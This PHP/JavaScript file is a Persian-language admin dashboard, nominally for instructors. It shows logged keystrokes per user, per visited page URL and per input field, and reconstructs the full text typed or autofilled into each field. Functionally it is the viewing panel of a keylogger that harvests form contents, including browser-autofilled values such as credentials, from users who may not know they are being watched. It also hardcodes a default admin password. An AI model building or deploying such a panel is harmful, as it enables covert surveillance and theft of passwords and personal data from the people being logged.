<?php
// dashboard.php - Management dashboard for instructors to view typing activity

session_start();

// Admin credentials (username and hashed password)
$adminUser = getenv('ADMIN_USER') ?: 'admin';
$adminPassHash = getenv('ADMIN_PASS_HASH') ?: '$2y$10$C/ACuHxj/.L.Ei7g9AsDBumhcgSfC20XlNcpofkqdfHMXEyZWJBna'; // Default password: admin123

$errorMsg = '';

// Handle logout
if (isset($_GET['logout'])) {
    unset($_SESSION['dashboard_logged_in']);
    header('Location: dashboard.php');
    exit;
}

// Handle login submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username === $adminUser && password_verify($password, $adminPassHash)) {
        $_SESSION['dashboard_logged_in'] = true;
        header('Location: dashboard.php');
        exit;
    } else {
        $errorMsg = 'نام کاربری یا رمز عبور اشتباه است.';
    }
}

$isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>داشبورد تحلیل عملکرد تایپیست‌ها</title>
    <style>
        :root {
            --primary: #2563eb;
            --primary-hover: #1d4ed8;
            --bg: #0f172a;
            --card-bg: #1e293b;
            --text: #f8fafc;
            --muted: #94a3b8;
            --border: #334155;
            --badge-bg: #1e293b;
            --accent: #10b981;
            --autofill-color: #f59e0b;
            --key-bg: #0f172a;
            --key-border: #475569;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            line-height: 1.6;
            padding: 24px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--card-bg);
            padding: 18px 28px;
            border-radius: 12px;
            border: 1px solid var(--border);
            margin-bottom: 24px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        }

        h1 {
            font-size: 1.35rem;
            color: var(--text);
            font-weight: 700;
        }

        .btn {
            display: inline-block;
            padding: 8px 16px;
            background-color: var(--primary);
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            font-size: 0.9rem;
            transition: all 0.2s;
        }

        .btn:hover {
            background-color: var(--primary-hover);
            transform: translateY(-1px);
        }

        .btn-outline {
            background: transparent;
            color: var(--muted);
            border: 1px solid var(--border);
        }

        .btn-outline:hover {
            background: #334155;
            color: var(--text);
        }

        .btn-sm {
            padding: 5px 12px;
            font-size: 0.82rem;
        }

        /* Login Form */
        .login-box {
            max-width: 400px;
            margin: 80px auto;
            background: var(--card-bg);
            padding: 32px;
            border-radius: 12px;
            border: 1px solid var(--border);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-size: 0.9rem;
            color: var(--muted);
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px 12px;
            background: var(--bg);
            border: 1px solid var(--border);
            color: var(--text);
            border-radius: 8px;
            font-size: 0.95rem;
            direction: ltr;
        }

        .error {
            background: rgba(220, 38, 38, 0.2);
            border: 1px solid #ef4444;
            color: #fca5a5;
            padding: 10px 14px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 0.85rem;
        }

        /* Breadcrumb */
        .breadcrumb {
            display: flex;
            gap: 8px;
            align-items: center;
            background: var(--card-bg);
            padding: 12px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            border: 1px solid var(--border);
        }

        .breadcrumb-item {
            color: #60a5fa;
            cursor: pointer;
        }

        .breadcrumb-item:hover {
            text-decoration: underline;
        }

        .breadcrumb-separator {
            color: var(--muted);
        }

        .breadcrumb-active {
            color: var(--muted);
        }

        /* Layout cards */
        .card {
            background: var(--card-bg);
            border-radius: 12px;
            border: 1px solid var(--border);
            padding: 24px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.25);
        }

        .card-title {
            font-size: 1.15rem;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        /* Lists */
        .list-group {
            list-style: none;
        }

        .list-item {
            padding: 14px 18px;
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 10px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.2s;
        }

        .list-item:hover {
            border-color: var(--primary);
            background: #1e293b;
        }

        .badge {
            background: #334155;
            color: var(--muted);
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 0.8rem;
        }

        .badge-autofill {
            background: rgba(245, 158, 11, 0.2);
            color: var(--autofill-color);
            border: 1px solid rgba(245, 158, 11, 0.4);
        }

        .badge-key {
            background: rgba(16, 185, 129, 0.2);
            color: var(--accent);
            border: 1px solid rgba(16, 185, 129, 0.4);
        }

        /* Dark Terminal Style Reconstruction & Keys Display */
        .terminal-box {
            background: #090d16;
            border: 1px solid #1e293b;
            border-radius: 10px;
            padding: 16px 20px;
            margin-top: 16px;
            font-family: "Fira Code", Monaco, Consolas, "Courier New", monospace;
            box-shadow: inset 0 2px 6px rgba(0,0,0,0.5);
        }

        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid #1e293b;
            color: var(--muted);
            font-size: 0.85rem;
        }

        .reconstructed-content {
            color: var(--accent);
            white-space: pre-wrap;
            word-break: break-all;
            direction: ltr;
            text-align: left;
            font-size: 0.95rem;
            line-height: 1.7;
        }

        .reconstructed-field-line {
            margin-bottom: 8px;
        }

        .reconstructed-field-tag {
            color: #60a5fa;
            font-weight: bold;
        }

        .reconstructed-value {
            color: #f1f5f9;
            background: #1e293b;
            padding: 2px 8px;
            border-radius: 4px;
            margin-left: 6px;
        }

        .keys-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 12px;
        }

        .key-badge-dark {
            display: inline-flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 8px 12px;
            min-width: 44px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.4);
            transition: transform 0.15s, border-color 0.15s;
            font-family: monospace;
        }

        .key-badge-dark:hover {
            border-color: var(--primary);
            transform: translateY(-2px);
        }

        .key-badge-dark.is-autofill {
            border-color: rgba(245, 158, 11, 0.5);
            background: rgba(245, 158, 11, 0.05);
        }

        .key-badge-dark .char {
            font-size: 1.15rem;
            font-weight: bold;
            color: var(--text);
        }

        .key-badge-dark.is-autofill .char {
            color: var(--autofill-color);
        }

        .key-badge-dark .meta {
            font-size: 0.68rem;
            color: var(--muted);
            margin-top: 3px;
        }

        .field-tabs {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-bottom: 16px;
        }

        .field-tab {
            padding: 8px 14px;
            border-radius: 8px;
            background: var(--bg);
            color: var(--muted);
            cursor: pointer;
            font-size: 0.85rem;
            border: 1px solid var(--border);
            transition: all 0.2s;
        }

        .field-tab:hover {
            border-color: var(--primary);
            color: var(--text);
        }

        .field-tab.active {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }

        .empty-state {
            text-align: center;
            color: var(--muted);
            padding: 30px 0;
            font-size: 0.9rem;
        }

        .loading {
            text-align: center;
            color: var(--muted);
            padding: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1>داشبورد تحلیل عملکرد تایپیست‌ها</h1>
        <?php if ($isLoggedIn): ?>
            <a href="dashboard.php?logout=1" class="btn btn-outline btn-sm">خروج از سیستم</a>
        <?php endif; ?>
    </header>

    <?php if (!$isLoggedIn): ?>
        <div class="login-box">
            <h2 style="margin-bottom: 20px; font-size: 1.2rem; text-align: center;">ورود به داشبورد مدیریتی</h2>
            <?php if ($errorMsg): ?>
                <div class="error"><?php echo htmlspecialchars($errorMsg); ?></div>
            <?php endif; ?>
            <form method="POST" action="dashboard.php">
                <div class="form-group">
                    <label>نام کاربری:</label>
                    <input type="text" name="username" required autocomplete="off">
                </div>
                <div class="form-group">
                    <label>رمز عبور:</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" name="login" class="btn" style="width: 100%;">ورود</button>
            </form>
        </div>
    <?php else: ?>

        <!-- Navigation Breadcrumb -->
        <div class="breadcrumb" id="breadcrumb">
            <span class="breadcrumb-item" onclick="showLevel(1)">سطح اول: کاربران</span>
        </div>

        <div class="grid">

            <!-- Level 1: Users List -->
            <div class="card" id="level-1-card">
                <div class="card-title">
                    <span>سطح اول - لیست کاربران</span>
                    <button class="btn btn-outline btn-sm" onclick="loadUsers()">بروزرسانی</button>
                </div>
                <ul class="list-group" id="users-list">
                    <li class="loading">در حال بارگذاری لیست کاربران...</li>
                </ul>
            </div>

            <!-- Level 2: User Pages -->
            <div class="card" id="level-2-card" style="display: none;">
                <div class="card-title">
                    <span id="level-2-title">سطح دوم - صفحات کاربر</span>
                    <button class="btn btn-outline btn-sm" onclick="showLevel(1)">بازگشت به کاربران</button>
                </div>
                <ul class="list-group" id="pages-list">
                    <li class="loading">در حال بارگذاری صفحات...</li>
                </ul>
            </div>

            <!-- Level 3: Fields & Keystrokes -->
            <div class="card" id="level-3-card" style="display: none;">
                <div class="card-title">
                    <span id="level-3-title">سطح سوم - کلیدهای ثبت‌شده</span>
                    <div>
                        <button class="btn btn-sm" id="btn-show-all-keys" onclick="selectAllFieldsKeys()">نمایش همه کلیدها</button>
                        <button class="btn btn-outline btn-sm" onclick="showLevel(2)">بازگشت به صفحات</button>
                    </div>
                </div>

                <div style="margin-bottom: 12px;">
                    <strong style="font-size: 0.9rem; color: var(--muted);">انتخاب کادر ورودی:</strong>
                </div>
                <div class="field-tabs" id="field-tabs">
                    <!-- Fields dynamically populated -->
                </div>

                <!-- Text Reconstruction Section -->
                <div class="terminal-box">
                    <div class="terminal-header">
                        <span>بازسازی دقیق مقادیر کادرها (Text Reconstruction)</span>
                        <span id="reconstruction-status" class="badge">آماده</span>
                    </div>
                    <div class="reconstructed-content" id="text-reconstruction"></div>
                </div>

                <!-- Exact Keystrokes Visualizer -->
                <div class="terminal-box" style="margin-top: 20px;">
                    <div class="terminal-header">
                        <span>نمایش دقیق کلیدهای فشرده‌شده و پرکننده خودکار (Exact Key Sequence)</span>
                        <span id="keystroke-count" class="badge">0 کلید</span>
                    </div>
                    <div class="keys-grid" id="keys-list">
                        <div class="empty-state">یک کادر ورودی را انتخاب کنید یا دکمه «نمایش همه کلیدها» را بزنید.</div>
                    </div>
                </div>
            </div>

        </div>

    <?php endif; ?>
</div>

<?php if ($isLoggedIn): ?>
<script>
    let selectedUserId = null;
    let selectedPageUrl = null;
    let selectedFieldId = 'all';

    document.addEventListener('DOMContentLoaded', function() {
        loadUsers();
    });

    function showLevel(level) {
        const l1 = document.getElementById('level-1-card');
        const l2 = document.getElementById('level-2-card');
        const l3 = document.getElementById('level-3-card');
        const bc = document.getElementById('breadcrumb');

        if (level === 1) {
            l1.style.display = 'block';
            l2.style.display = 'none';
            l3.style.display = 'none';
            selectedUserId = null;
            selectedPageUrl = null;
            bc.innerHTML = `<span class="breadcrumb-item" onclick="showLevel(1)">سطح اول: کاربران</span>`;
        } else if (level === 2) {
            l1.style.display = 'none';
            l2.style.display = 'block';
            l3.style.display = 'none';
            selectedPageUrl = null;
            bc.innerHTML = `
                <span class="breadcrumb-item" onclick="showLevel(1)">سطح اول: کاربران</span>
                <span class="breadcrumb-separator">/</span>
                <span class="breadcrumb-item" onclick="showLevel(2)">user : ${escapeHtml(selectedUserId)}</span>
            `;
        } else if (level === 3) {
            l1.style.display = 'none';
            l2.style.display = 'none';
            l3.style.display = 'block';
            bc.innerHTML = `
                <span class="breadcrumb-item" onclick="showLevel(1)">سطح اول: کاربران</span>
                <span class="breadcrumb-separator">/</span>
                <span class="breadcrumb-item" onclick="showLevel(2)">user : ${escapeHtml(selectedUserId)}</span>
                <span class="breadcrumb-separator">/</span>
                <span class="breadcrumb-active">url : ${escapeHtml(selectedPageUrl)}</span>
            `;
        }
    }

    function loadUsers() {
        const container = document.getElementById('users-list');
        container.innerHTML = '<li class="loading">در حال بارگذاری لیست کاربران...</li>';

        fetch('api.php?action=get_users')
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    if (data.users.length === 0) {
                        container.innerHTML = '<li class="empty-state">هیچ کاربری هنوز ثبت نشده است.</li>';
                        return;
                    }
                    container.innerHTML = data.users.map(u => `
                        <li class="list-item" onclick="selectUser('${escapeJs(u)}')">
                            <span>user : <strong>${escapeHtml(u)}</strong></span>
                            <span class="badge">مشاهده فعالیت‌ها &larr;</span>
                        </li>
                    `).join('');
                } else {
                    container.innerHTML = `<li class="error">خطا: ${escapeHtml(data.message)}</li>`;
                }
            })
            .catch(err => {
                container.innerHTML = `<li class="error">خطا در دریافت داده‌ها از سرور.</li>`;
            });
    }

    function selectUser(userId) {
        selectedUserId = userId;
        document.getElementById('level-2-title').innerText = `سطح دوم - صفحات بازدید شده توسط user : ${userId}`;
        showLevel(2);
        loadPages(userId);
    }

    function loadPages(userId) {
        const container = document.getElementById('pages-list');
        container.innerHTML = '<li class="loading">در حال بارگذاری صفحات...</li>';

        fetch(`api.php?action=get_pages&user_id=${encodeURIComponent(userId)}`)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    if (data.pages.length === 0) {
                        container.innerHTML = '<li class="empty-state">هیچ صفحه‌ای برای این کاربر یافت نشد.</li>';
                        return;
                    }
                    container.innerHTML = data.pages.map(p => `
                        <li class="list-item" onclick="selectPage('${escapeJs(p)}')">
                            <span style="direction: ltr; text-align: right;">url : <strong>${escapeHtml(p)}</strong></span>
                            <span class="badge">مشاهده کادرها &larr;</span>
                        </li>
                    `).join('');
                } else {
                    container.innerHTML = `<li class="error">خطا: ${escapeHtml(data.message)}</li>`;
                }
            })
            .catch(err => {
                container.innerHTML = `<li class="error">خطا در دریافت داده‌ها از سرور.</li>`;
            });
    }

    function selectPage(pageUrl) {
        selectedPageUrl = pageUrl;
        document.getElementById('level-3-title').innerText = `سطح سوم - کلیدهای ثبت‌شده در صفحه ${pageUrl}`;
        showLevel(3);
        loadFieldsAndKeys(selectedUserId, selectedPageUrl);
    }

    function loadFieldsAndKeys(userId, pageUrl) {
        const tabsContainer = document.getElementById('field-tabs');
        tabsContainer.innerHTML = '<span class="loading">در حال بارگذاری کادرها...</span>';

        fetch(`api.php?action=get_fields&user_id=${encodeURIComponent(userId)}&page_url=${encodeURIComponent(pageUrl)}`)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    const fields = data.fields || [];
                    let html = `<button class="field-tab active" id="tab-all" onclick="selectField('all')">همه کادرها (کل کلیدها)</button>`;

                    fields.forEach(f => {
                        const label = f.field_name ? `${f.field_id} (${f.field_name})` : f.field_id;
                        html += `<button class="field-tab" id="tab-${escapeHtml(f.field_id)}" onclick="selectField('${escapeJs(f.field_id)}')">${escapeHtml(label)} <span class="badge">${f.key_count}</span></button>`;
                    });

                    tabsContainer.innerHTML = html;
                    selectField('all');
                } else {
                    tabsContainer.innerHTML = `<span class="error">خطا در بارگذاری کادرها</span>`;
                }
            });
    }

    function selectField(fieldId) {
        selectedFieldId = fieldId;

        document.querySelectorAll('.field-tab').forEach(t => t.classList.remove('active'));
        const activeTab = document.getElementById(`tab-${fieldId}`) || document.getElementById('tab-all');
        if (activeTab) activeTab.classList.add('active');

        loadKeys(selectedUserId, selectedPageUrl, fieldId);
    }

    function selectAllFieldsKeys() {
        selectField('all');
    }

    function loadKeys(userId, pageUrl, fieldId) {
        const keysContainer = document.getElementById('keys-list');
        const textPreview = document.getElementById('text-reconstruction');
        const countBadge = document.getElementById('keystroke-count');

        keysContainer.innerHTML = '<div class="loading">در حال دریافت کلیدها...</div>';
        textPreview.innerHTML = '<span class="loading">در حال پردازش بازسازی متنی...</span>';

        let url = `api.php?action=get_keys&user_id=${encodeURIComponent(userId)}&page_url=${encodeURIComponent(pageUrl)}`;
        if (fieldId && fieldId !== 'all') {
            url += `&field_id=${encodeURIComponent(fieldId)}`;
        }

        fetch(url)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    const keys = data.keys || [];
                    countBadge.innerText = `${keys.length} کلید`;

                    if (keys.length === 0) {
                        keysContainer.innerHTML = '<div class="empty-state">هیچ کلیدی ثبت نشده است.</div>';
                        textPreview.innerText = 'متن ورودی خالی است.';
                        return;
                    }

                    // Render dark styled key badges
                    keysContainer.innerHTML = keys.map((k, index) => {
                        let displayChar = k.key_char;
                        if (displayChar === ' ') displayChar = '␣';
                        if (displayChar === 'Enter') displayChar = '↵';
                        if (displayChar === 'Backspace') displayChar = '⌫';
                        if (displayChar === 'Tab') displayChar = '⇥';

                        const isAutofill = k.key_code === 'Autofill';
                        const badgeClass = isAutofill ? 'key-badge-dark is-autofill' : 'key-badge-dark';
                        const typeLabel = isAutofill ? 'Autofill' : `#${k.sequence_order}`;

                        return `
                            <div class="${badgeClass}" title="Field: ${escapeHtml(k.field_id)} | Code: ${escapeHtml(k.key_code)} | Order: #${k.sequence_order}">
                                <span class="char">${escapeHtml(displayChar)}</span>
                                <span class="meta">${escapeHtml(typeLabel)}</span>
                            </div>
                        `;
                    }).join('');

                    // Precise text reconstruction per field without autofill collision
                    const fieldValues = {};
                    const fieldAutofillActive = {};

                    keys.forEach(k => {
                        const fId = k.field_id;
                        if (!fieldValues[fId]) {
                            fieldValues[fId] = '';
                            fieldAutofillActive[fId] = false;
                        }

                        if (k.key_code === 'Autofill') {
                            // If first character of an autofill block, reset/overwrite field value cleanly
                            if (!fieldAutofillActive[fId]) {
                                fieldValues[fId] = '';
                                fieldAutofillActive[fId] = true;
                            }
                            fieldValues[fId] += k.key_char;
                        } else {
                            fieldAutofillActive[fId] = false;
                            if (k.key_char === 'Backspace') {
                                fieldValues[fId] = fieldValues[fId].slice(0, -1);
                            } else if (k.key_char === 'Enter') {
                                fieldValues[fId] += '\n';
                            } else if (k.key_char === 'Tab') {
                                fieldValues[fId] += '\t';
                            } else if (k.key_char && k.key_char.length === 1) {
                                fieldValues[fId] += k.key_char;
                            }
                        }
                    });

                    let reconstructionHtml = '';
                    for (const [fId, val] of Object.entries(fieldValues)) {
                        reconstructionHtml += `<div class="reconstructed-field-line">
                            <span class="reconstructed-field-tag">[${escapeHtml(fId)}]:</span>
                            <span class="reconstructed-value">${escapeHtml(val || '(خالی)')}</span>
                        </div>`;
                    }

                    textPreview.innerHTML = reconstructionHtml || 'متن ورودی خالی است.';
                } else {
                    keysContainer.innerHTML = `<div class="error">خطا: ${escapeHtml(data.message)}</div>`;
                }
            })
            .catch(err => {
                keysContainer.innerHTML = `<div class="error">خطا در برقراری ارتباط با سرور.</div>`;
            });
    }

    function escapeHtml(str) {
        if (!str) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    function escapeJs(str) {
        if (!str) return '';
        return String(str).replace(/'/g, "\\'").replace(/"/g, '\\"');
    }
</script>
<?php endif; ?>

</body>
</html>
